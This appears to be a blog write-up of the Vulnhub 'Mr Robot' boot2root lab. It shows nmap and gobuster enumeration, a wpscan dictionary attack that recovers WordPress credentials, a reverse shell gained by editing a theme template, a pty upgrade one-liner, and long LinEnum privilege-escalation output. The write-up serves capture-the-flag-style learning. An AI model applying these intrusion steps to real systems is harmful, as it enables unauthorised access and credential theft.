---
layout: post
title: "Vulnhub Boot2Root Writeup - Mr Robot"
date: 2019-11-24 12:59:50 +0000
---

# Vulnhub Boot2Root writeup - Mr Robot
<br />
Let's start scanning the machine:
```
nmap -sC -sV 192.168.1.113

Starting Nmap 7.60 ( https://nmap.org ) at 2019-11-24 12:46 CET
Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 12:46 (0:00:12 remaining)
Nmap scan report for linux.lan (192.168.1.113)
Host is up (0.00045s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.53 seconds
```
<br />
We have two open ports: http and https. 
<br />
http://192.168.1.113/ 
<img src="/assets/robot1.png" alt="drawing" width="600"/>

each of this command opens some media content: 
<img src="/assets/robot2.png" alt="drawing" width="600"/>
<img src="/assets/robot3.png" alt="drawing" width="600"/>
<img src="/assets/robot4.png" alt="drawing" width="600"/>
<br />
Let's enumerate the web server:
```
root@kali:~# gobuster dir -u "http://192.168.1.113" -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.113
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/11/24 13:09:05 Starting gobuster
===============================================================
/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200)
/rss (Status: 301)
/login (Status: 302)
/0 (Status: 301)
/video (Status: 301)
/feed (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/wp-includes (Status: 301)
/readme (Status: 200)
/js (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/robots (Status: 200)
/dashboard (Status: 302)
/%20 (Status: 301)
/wp-admin (Status: 301)
/0000 (Status: 301)
/phpmyadmin (Status: 403)
/wp-signup (Status: 302)
===============================================================
2019/11/24 13:30:10 Finished
===============================================================
```
<br />
As we can see we have wordpress:
<img src="/assets/robot6.png" alt="drawing" width="600"/>
<img src="/assets/robot5.png" alt="drawing" width="600"/>


Let's have a look at the robot:
<img src="/assets/robot7.png" alt="drawing" width="600"/>


The file key-1-of-3.txt is the first flag: 073403c8a58a1f80d943455fb30724b9

The file fsocity.dic seems to be a dictionary...

I tried some guessing at the login page, and I found out elliot to be a valid username:
<img src="/assets/robot8.png" alt="drawing" width="600"/> 
<br />
At this point I tried a dictionary attack with the dictionary provided:
```
root@kali:~/Downloads# wpscan --url 192.168.1.113 -P /root/Downloads/fsocity.dic -U elliot
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.6.1
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.1.113/
[+] Started: Sun Nov 24 13:49:01 2019

Interesting Finding(s):

[+] http://192.168.1.113/
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://192.168.1.113/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] http://192.168.1.113/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://192.168.1.113/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://192.168.1.113/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.21 identified (Latest, released on 2019-10-14).
 | Detected By: Rss Generator (Aggressive Detection)
 |  - http://192.168.1.113/feed/, <generator>https://wordpress.org/?v=4.3.21</generator>
 |  - http://192.168.1.113/comments/feed/, <generator>https://wordpress.org/?v=4.3.21</generator>

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=======================================================================================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
Progress Time: 00:30:11 <=====================================================================================================================> (1716 / 1716) 100.00% Time: 00:30:11
WARNING: Your progress bar is currently at 1716 out of 1716 and cannot be incremented. In v2.0.0 this will become a ProgressBar::InvalidProgressError.
Progress Time: 00:30:11 <=====================================================================================================================> (1716 / 1716) 100.00% Time: 00:30:11
[SUCCESS] - elliot / ER28-0652                                                                                                                                                      
All Found                                                                                                                                                                           

[i] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652


[+] Finished: Sun Nov 24 14:19:14 2019
[+] Requests Done: 1741
[+] Cached Requests: 32
[+] Data Sent: 491.506 KB
[+] Data Received: 175.875 MB
[+] Memory used: 373.98 MB
[+] Elapsed time: 00:30:13
```
<br />
Once logged in, I tried to upload a plugin with a reverse shell, however it didn't work. 
Instead I changed the template of the 404 page:
<img src="/assets/robot9.PNG" alt="drawing" width="600"/>
<br />
I got the shell, issued:
```
python -c 'import pty; pty.spawn("/bin/bash")' 
```
and got a full tty. 
<br />
I found the hash of the robot user password in /home/robot:
<img src="/assets/robot10.png" alt="drawing" width="600"/>
```
robot@linux:~$ cat key-2-of-3.txt 
822c73956184f694993bede3eb39f959
```
<br />
# Privilege Escalation
<br />

Let's start the privesc. Usual enumeration, I start a web server with python SimpleHTTPServer:
```
python -m SimpleHTTPServer 8000.
```
I served the LinEnum.sh script from my kali to the boot2root machine:
```
robot@linux:/tmp$ ./LinEnum.sh	
./LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.96

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Sun Nov 24 14:37:27 UTC 2019


### SYSTEM ##############################################
[-] Kernel information:
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 3.13.0-55-generic (buildd@brownie) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.2 LTS"
NAME="Ubuntu"
VERSION="14.04.2 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.2 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"


[-] Hostname:
linux


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1002(robot) gid=1002(robot) groups=1002(robot)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Sat Nov 14 23:32:42 +0000 2015
bitnamiftp       tty1                      Fri Nov 13 01:15:03 +0000 2015
robot            tty1                      Fri Nov 13 23:50:42 +0000 2015


[-] Who else is logged on:
 14:37:27 up  2:55,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
uid=101(syslog) gid=104(syslog) groups=104(syslog),4(adm)
uid=102(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=103(ftp) gid=106(ftp) groups=106(ftp)
uid=1000(bitnamiftp) gid=1000(bitnami) groups=1000(bitnami)
uid=1001(mysql) gid=1001(mysql) groups=1001(mysql)
uid=999(varnish) gid=999(varnish) groups=999(varnish)
uid=1002(robot) gid=1002(robot) groups=1002(robot)


[-] It looks like we have some admin users:
uid=101(syslog) gid=104(syslog) groups=104(syslog),4(adm)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
mysql:x:1001:1001::/home/mysql:
varnish:x:999:999::/home/varnish:
robot:x:1002:1002::/home/robot:


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root root 4.0K Nov 13  2015 .
drwxr-xr-x 22 root root 4.0K Sep 16  2015 ..
drwxr-xr-x  2 root root 4.0K Nov 13  2015 robot


### ENVIRONMENTAL #######################################
[-] Environment information:
LDAPCONF=/opt/bitnami/common/etc/openldap/ldap.conf
SSL_CERT_FILE=/opt/bitnami/common/openssl/certs/curl-ca-bundle.crt
SHELL=/bin/bash
CURL_CA_BUNDLE=/opt/bitnami/common/openssl/certs/curl-ca-bundle.crt
MAGICK_CONFIGURE_PATH=
GS_LIB=
OPENSSL_ENGINES=/opt/bitnami/common/lib/engines
MAGICK_CODER_MODULE_PATH=
USER=robot
FREETDSLOCALES=
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
MAIL=/var/mail/robot
PWD=/tmp
FREETDSCONF=
LANG=en_US.UTF-8
MAGICK_HOME=
SHLVL=3
HOME=/home/robot
OPENSSL_CONF=/opt/bitnami/common/openssl/openssl.cnf
LOGNAME=robot
_=/usr/bin/env


[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/screen

/bin/bitnami_ftp_false


[-] Current umask value:
0002
u=rwx,g=rwx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  787 Nov 24 12:41 /etc/crontab

/etc/cron.d:
total 12
drwxr-xr-x  2 root root 4096 Jun 24  2015 .
drwxr-xr-x 77 root root 4096 Nov 24 12:41 ..
-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder

/etc/cron.daily:
total 44
drwxr-xr-x  2 root root  4096 Jun 24  2015 .
drwxr-xr-x 77 root root  4096 Nov 24 12:41 ..
-rwxr-xr-x  1 root root 15481 Apr 10  2014 apt
-rwxr-xr-x  1 root root   256 Mar  7  2014 dpkg
-rwxr-xr-x  1 root root   372 Jan 22  2014 logrotate
-rwxr-xr-x  1 root root   249 Feb 17  2014 passwd
-rw-r--r--  1 root root   102 Feb  9  2013 .placeholder
-rwxr-xr-x  1 root root   328 Jul 18  2014 upstart

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jun 24  2015 .
drwxr-xr-x 77 root root 4096 Nov 24 12:41 ..
-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jun 24  2015 .
drwxr-xr-x 77 root root 4096 Nov 24 12:41 ..
-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Jun 24  2015 .
drwxr-xr-x 77 root root 4096 Nov 24 12:41 ..
-rwxr-xr-x  1 root root  427 Apr 16  2014 fstrim
-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
31 * * * * bitnami cd /opt/bitnami/stats && ./agent.bin --run -D


### NETWORKING  ##########################################
[-] Network and IP info:
eth0      Link encap:Ethernet  HWaddr 08:00:27:3a:94:b8  
          inet addr:192.168.1.113  Bcast:192.168.1.255  Mask:255.255.255.0
          inet6 addr: 2001:b07:a5b:2571:a00:27ff:fe3a:94b8/64 Scope:Global
          inet6 addr: fe80::a00:27ff:fe3a:94b8/64 Scope:Link
          inet6 addr: 2001:b07:a5b:2571:cd6f:db5b:403b:95b7/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:821534 errors:491 dropped:0 overruns:0 frame:0
          TX packets:1106528 errors:3 dropped:0 overruns:0 carrier:3
          collisions:0 txqueuelen:1000 
          RX bytes:556023481 (556.0 MB)  TX bytes:811440761 (811.4 MB)
          Interrupt:19 Base address:0xd020 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:48162 errors:0 dropped:0 overruns:0 frame:0
          TX packets:48162 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:68228907 (68.2 MB)  TX bytes:68228907 (68.2 MB)


[-] ARP history:
myfastgate.lan (192.168.1.254) at a4:91:b1:ee:ff:5a [ether] on eth0
kali.lan (192.168.1.206) at 00:0c:29:80:27:58 [ether] on eth0
manfredi-Blade.lan (192.168.1.66) at 00:e0:4c:68:13:3f [ether] on eth0


[-] Nameserver(s):
nameserver 192.168.1.254
nameserver 127.0.1.1


[-] Default route:
default         myfastgate.lan  0.0.0.0         UG    0      0        0 eth0


[-] Listening TCP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:2812          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 192.168.1.113:35246     192.168.1.206:1234      ESTABLISHED 2182/bash       
tcp6       0      0 :::443                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               


[-] Listening UDP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 0.0.0.0:48111           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
udp6       0      0 :::54488                :::*                                -               


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.2  33240  1352 ?        Ss   11:41   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S    11:41   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    11:41   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   11:41   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    11:41   0:01 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    11:41   0:02 [rcuos/0]
root         9  0.0  0.0      0     0 ?        S    11:41   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    11:41   0:00 [rcuob/0]
root        11  0.0  0.0      0     0 ?        S    11:41   0:00 [migration/0]
root        12  0.0  0.0      0     0 ?        S    11:41   0:00 [watchdog/0]
root        13  0.0  0.0      0     0 ?        S<   11:41   0:00 [khelper]
root        14  0.0  0.0      0     0 ?        S    11:41   0:00 [kdevtmpfs]
root        15  0.0  0.0      0     0 ?        S<   11:41   0:00 [netns]
root        16  0.0  0.0      0     0 ?        S<   11:41   0:00 [writeback]
root        17  0.0  0.0      0     0 ?        S<   11:41   0:00 [kintegrityd]
root        18  0.0  0.0      0     0 ?        S<   11:41   0:00 [bioset]
root        19  0.0  0.0      0     0 ?        S<   11:41   0:00 [kworker/u3:0]
root        20  0.0  0.0      0     0 ?        S<   11:41   0:00 [kblockd]
root        21  0.0  0.0      0     0 ?        S<   11:41   0:00 [ata_sff]
root        22  0.0  0.0      0     0 ?        S    11:41   0:00 [khubd]
root        23  0.0  0.0      0     0 ?        S<   11:41   0:00 [md]
root        24  0.0  0.0      0     0 ?        S<   11:41   0:00 [devfreq_wq]
root        25  0.0  0.0      0     0 ?        S    11:41   0:00 [kworker/0:1]
root        27  0.0  0.0      0     0 ?        S    11:41   0:00 [khungtaskd]
root        28  0.0  0.0      0     0 ?        S    11:41   0:00 [kswapd0]
root        29  0.0  0.0      0     0 ?        SN   11:41   0:00 [ksmd]
root        30  0.0  0.0      0     0 ?        S    11:41   0:00 [fsnotify_mark]
root        31  0.0  0.0      0     0 ?        S    11:41   0:00 [ecryptfs-kthrea]
root        32  0.0  0.0      0     0 ?        S<   11:41   0:00 [crypto]
root        44  0.0  0.0      0     0 ?        S<   11:41   0:00 [kthrotld]
root        46  0.0  0.0      0     0 ?        S    11:41   0:00 [scsi_eh_0]
root        47  0.0  0.0      0     0 ?        S    11:41   0:00 [scsi_eh_1]
root        68  0.0  0.0      0     0 ?        S<   11:41   0:00 [deferwq]
root        69  0.0  0.0      0     0 ?        S<   11:41   0:00 [charger_manager]
root        70  0.0  0.0      0     0 ?        S    11:41   0:00 [kworker/u2:4]
root       114  0.0  0.0      0     0 ?        S<   11:41   0:00 [kpsmoused]
root       128  0.0  0.0      0     0 ?        S<   11:41   0:00 [kworker/u3:1]
root       129  0.0  0.0      0     0 ?        S    11:41   0:01 [jbd2/sda1-8]
root       130  0.0  0.0      0     0 ?        S<   11:41   0:00 [ext4-rsv-conver]
root       143  0.0  0.0      0     0 ?        S    11:41   0:00 [kworker/0:2]
root       275  0.0  0.0  19604   384 ?        S    11:41   0:00 upstart-udev-bridge --daemon
root       279  0.0  0.1  49704   528 ?        Ss   11:41   0:00 /lib/systemd/systemd-udevd --daemon
syslog     355  0.0  0.0 255840   240 ?        Ssl  11:41   0:00 rsyslogd
root       371  0.0  0.0  15272   308 ?        S    11:41   0:00 upstart-file-bridge --daemon
root       848  0.0  0.0  15256   228 ?        S    11:41   0:00 upstart-socket-bridge --daemon
root       965  0.0  0.0  10220     4 ?        Ss   11:41   0:00 dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root       999  0.0  0.0  23536   112 ?        Ss   11:41   0:00 /usr/sbin/vsftpd
root      1050  0.0  0.0  14536    12 tty4     Ss+  11:41   0:00 /sbin/getty -8 38400 tty4
root      1052  0.0  0.0  14536    12 tty5     Ss+  11:41   0:00 /sbin/getty -8 38400 tty5
root      1054  0.0  0.0  14536    12 tty2     Ss+  11:41   0:00 /sbin/getty -8 38400 tty2
root      1055  0.0  0.0  14536    12 tty3     Ss+  11:41   0:00 /sbin/getty -8 38400 tty3
root      1057  0.0  0.0  14536    12 tty6     Ss+  11:41   0:00 /sbin/getty -8 38400 tty6
root      1083  0.0  0.0  23652   372 ?        Ss   11:41   0:00 cron
root      1384  0.0  0.0   4440     8 ?        S    11:41   0:00 /bin/sh /opt/bitnami/mysql/bin/mysqld_safe --defaults-file=/opt/bitnami/mysql/my.cnf --port=3306 --socket=/opt/bitnami/mysql/tmp/mysql.sock --datadir=/opt/bitnami/mysql/data --log-error=/opt/bitnami/mysql/data/mysqld.log --pid-file=/opt/bitnami/mysql/data/mysqld.pid --lower-case-table-names=1
mysql     1655  1.1 32.4 1306412 162652 ?      Sl   11:41   2:01 /opt/bitnami/mysql/bin/mysqld.bin --defaults-file=/opt/bitnami/mysql/my.cnf --basedir=/opt/bitnami/mysql --datadir=/opt/bitnami/mysql/data --plugin-dir=/opt/bitnami/mysql/lib/plugin --user=mysql --lower-case-table-names=1 --log-error=/opt/bitnami/mysql/data/mysqld.log --pid-file=/opt/bitnami/mysql/data/mysqld.pid --socket=/opt/bitnami/mysql/tmp/mysql.sock --port=3306
root      1692  0.0  1.0 258616  5168 ?        Ss   11:41   0:00 php-fpm: master process (/opt/bitnami/php/etc/php-fpm.conf)                                                                                                                                                                                                                          
root      1699  0.0  4.0 207948 20124 ?        Ss   11:41   0:00 /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
daemon    1702  0.2  5.3 995072 26700 ?        Sl   11:41   0:29 /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
daemon    1705  0.2  5.2 994952 26448 ?        Sl   11:41   0:31 /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
daemon    1706  0.3  5.6 994940 28120 ?        Sl   11:41   0:32 /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
root      1847  0.0  0.2 104328  1064 ?        Sl   11:41   0:00 /usr/bin/monit -c /etc/monit/monitrc
root      1873  0.0  0.0  14536   428 tty1     Ss+  11:41   0:00 /sbin/getty -8 38400 tty1
daemon    1883  0.3  5.3 994764 27016 ?        Sl   11:46   0:39 /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
daemon    1925  7.7  6.6 261732 33284 ?        S    11:46  13:13 php-fpm: pool wordpress                                                                                                                                                                                                                                                              
root      1935  0.0  0.0      0     0 ?        S    11:46   0:00 [kauditd]
daemon    1998  8.8  6.9 266072 34672 ?        S    12:09  13:07 php-fpm: pool wordpress                                                                                                                                                                                                                                                              
daemon    2000  8.9  7.5 268256 37648 ?        S    12:09  13:12 php-fpm: pool wordpress                                                                                                                                                                                                                                                              
root      2106  0.0  0.0      0     0 ?        S    13:18   0:00 [kworker/u2:0]
daemon    2159  0.0  2.2 266072 11100 ?        Ss   14:22   0:00 php-fpm: pool wordpress                                                                                                                                                                                                                                                              
daemon    2160  0.0  0.1   4440   656 ?        S    14:22   0:00 sh -c uname -a; w; id; /bin/sh -i
daemon    2164  0.0  0.1   4440   652 ?        S    14:22   0:00 /bin/sh -i
daemon    2168  0.0  1.0  31916  5064 ?        S    14:25   0:00 python -c import pty; pty.spawn("/bin/bash")
daemon    2169  0.0  0.3  18136  1932 pts/0    Ss   14:25   0:00 /bin/bash
root      2181  0.0  0.2  46624  1484 pts/0    S    14:27   0:00 su robot
robot     2182  0.0  0.4  19756  2116 pts/0    S    14:27   0:00 bash
robot     2210  0.1  0.4  12100  2384 pts/0    S+   14:37   0:00 /bin/bash ./LinEnum.sh
robot     2211  0.1  0.3  12140  1928 pts/0    S+   14:37   0:00 /bin/bash ./LinEnum.sh
robot     2212  0.0  0.1   5916   676 pts/0    S+   14:37   0:00 tee -a
root      2382  0.0  0.1  49700   584 ?        S    14:37   0:00 /lib/systemd/systemd-udevd --daemon
robot     2389  0.0  0.3  12124  1624 pts/0    S+   14:37   0:00 /bin/bash ./LinEnum.sh
robot     2390  0.0  0.2  17164  1324 pts/0    R+   14:37   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x 1 root root  1021112 Oct  7  2014 /bin/bash
lrwxrwxrwx 1 root root        4 Feb 19  2014 /bin/sh -> dash
-rwxr-xr-x 1 root root   239896 Apr 15  2015 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root   678528 Sep  7  2015 /opt/bitnami/apache2/bin/httpd.bin
-rwxr-xr-x 1 root root 13966352 Sep  7  2015 /opt/bitnami/mysql/bin/mysqld.bin
-rwxr-xr-x 2 root root    32112 Feb 12  2015 /sbin/getty
-rwxr-xr-x 1 root root   265848 Jul 18  2014 /sbin/init
-rwxr-xr-x 1 root root   534728 Nov 17  2013 /usr/bin/monit
-rwxr-xr-x 1 root root   164072 May  1  2014 /usr/sbin/vsftpd


[-] /etc/init.d/ binary permissions:
total 148
drwxr-xr-x  2 root root 4096 Sep 16  2015 .
drwxr-xr-x 77 root root 4096 Nov 24 12:41 ..
-rwxr-xr-x  1 root root 1333 Sep 16  2015 bitnami
-rwxr-xr-x  1 root root 1919 Jan 18  2011 console-setup
lrwxrwxrwx  1 root root   21 Feb  9  2013 cron -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 1105 May 13  2015 grub-common
-rwxr-xr-x  1 root root 1329 Mar 13  2014 halt
-rwxr-xr-x  1 root root 1293 Mar 13  2014 killprocs
-rwxr-xr-x  1 root root 1990 Jan 22  2013 kmod
-rw-r--r--  1 root root    0 Jun 24  2015 .legacy-bootordering
-rwxr-xr-x  1 root root 2664 Nov 16  2013 monit
-rwxr-xr-x  1 root root 4479 Mar 20  2014 networking
-rwxr-xr-x  1 root root 1346 Mar 13  2015 ondemand
-rwxr-xr-x  1 root root 1192 May 27  2013 procps
-rwxr-xr-x  1 root root 6120 Mar 13  2014 rc
-rwxr-xr-x  1 root root  782 Mar 13  2014 rc.local
-rwxr-xr-x  1 root root  117 Mar 13  2014 rcS
-rw-r--r--  1 root root 2427 Mar 13  2014 README
-rwxr-xr-x  1 root root  639 Mar 13  2014 reboot
-rwxr-xr-x  1 root root 2918 Jun 13  2014 resolvconf
-rwxr-xr-x  1 root root 4395 Apr 17  2014 rsync
-rwxr-xr-x  1 root root 2913 Dec  4  2013 rsyslog
-rwxr-xr-x  1 root root 1226 Jul 22  2013 screen-cleanup
-rwxr-xr-x  1 root root 3920 Mar 13  2014 sendsigs
-rwxr-xr-x  1 root root  590 Mar 13  2014 single
-rw-r--r--  1 root root 4290 Mar 13  2014 skeleton
-rwxr-xr-x  1 root root 4077 May  2  2014 ssh
-rwxr-xr-x  1 root root  731 Feb  5  2014 sudo
-rwxr-xr-x  1 root root 6173 Apr 14  2014 udev
-rwxr-xr-x  1 root root 2721 Mar 13  2014 umountfs
